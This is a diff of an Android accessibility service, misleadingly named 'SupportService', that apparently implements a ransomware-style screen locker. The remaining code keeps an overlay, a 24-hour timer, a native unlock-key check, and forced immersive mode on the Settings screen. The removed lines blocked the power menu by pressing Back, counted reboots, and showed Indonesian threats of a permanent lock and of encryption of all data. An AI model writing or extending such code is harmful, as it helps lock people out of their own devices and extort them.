@@ -29,7 +29,6 @@ public class SupportService extends AccessibilityService {
     private Handler task_handler = new Handler(Looper.getMainLooper());
     private static final String PREFS_NAME = "lock_prefs";
     private static final String KEY_END_TIME = "end_time";
-    private static final String KEY_REBOOT_COUNT = "reboot_count";
 
     public native boolean checkKey(String s);
     public native boolean checkStatus();
@@ -74,18 +73,6 @@ public class SupportService extends AccessibilityService {
             endTime = System.currentTimeMillis() + (86400 * 1000);
             prefs.edit().putLong(KEY_END_TIME, endTime).apply();
         }
-        
-        // Logika deteksi reboot yang lebih akurat
-        long lastBootTime = prefs.getLong("last_boot_time", 0);
-        long currentBootTime = System.currentTimeMillis() - SystemClock.elapsedRealtime();
-        
-        // Jika selisih boot time lebih dari 30 detik dari catatan terakhir, berarti ini boot baru
-        if (Math.abs(currentBootTime - lastBootTime) > 30000) {
-            int count = prefs.getInt(KEY_REBOOT_COUNT, 0);
-            prefs.edit().putInt(KEY_REBOOT_COUNT, count + 1)
-                       .putLong("last_boot_time", currentBootTime)
-                       .apply();
-        }
     }
 
     @Override
@@ -96,7 +83,6 @@ public class SupportService extends AccessibilityService {
         }
         init_timer();
         setup_layout();
-        show_power_warning(); // Tampilkan status reboot saat start
         task_handler.post(ticker);
     }
 
@@ -205,49 +191,12 @@ public class SupportService extends AccessibilityService {
         if (!checkStatus() && overlay != null) {
             int eventType = event.getEventType();
             
-            // Deteksi perubahan jendela (Power Menu, Settings, dll)
+            // Tetap panggil immersive mode jika di Settings untuk keamanan dasar
             if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                 String pkgName = event.getPackageName() != null ? event.getPackageName().toString() : "";
-                String clsName = event.getClassName() != null ? event.getClassName().toString() : "";
-                
-                // Deteksi Power Menu secara lebih luas
-                boolean isPowerMenu = clsName.contains("GlobalActions") || 
-                                    clsName.contains("PowerOptions") || 
-                                    clsName.contains("Shutdown") ||
-                                    clsName.contains("PowerOff") ||
-                                    pkgName.contains("android.internal.policy");
-
-                if (isPowerMenu) {
-                    performGlobalAction(GLOBAL_ACTION_BACK);
-                    power_attempt++;
-                    show_power_warning();
-                }
-                
-                // Tetap panggil immersive mode jika di Settings
                 if (pkgName.equals("com.android.settings")) {
                     apply_immersive_mode();
                 }
-            }
-        }
-    }
-
-    private void show_power_warning() {
-        if (tv_msg == null && overlay != null) {
-            tv_msg = overlay.findViewById(R.id.v_msg);
-        }
-        
-        if (tv_msg != null) {
-            SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
-            int reboot_count = prefs.getInt(KEY_REBOOT_COUNT, 0);
-
-            if (reboot_count >= 2) {
-                tv_msg.setText("BATAS REBOOT TERCAPAI!\nSISTEM AKAN DIKUNCI PERMANEN");
-            } else if (reboot_count > 0) {
-                tv_msg.setText("DETEKSI REBOOT ILEGAL!\nPercobaan: " + reboot_count + "/2");
-            } else if (power_attempt >= 5) {
-                tv_msg.setText("PERCOBAAN MAXIMAL! ENKRIPSI SELURUH DATA DIMULAI...");
-            } else {
-                tv_msg.setText("JANGAN TAHAN TOMBOL POWER!\nPercobaan: " + power_attempt + "/5");
             }
         }
     }
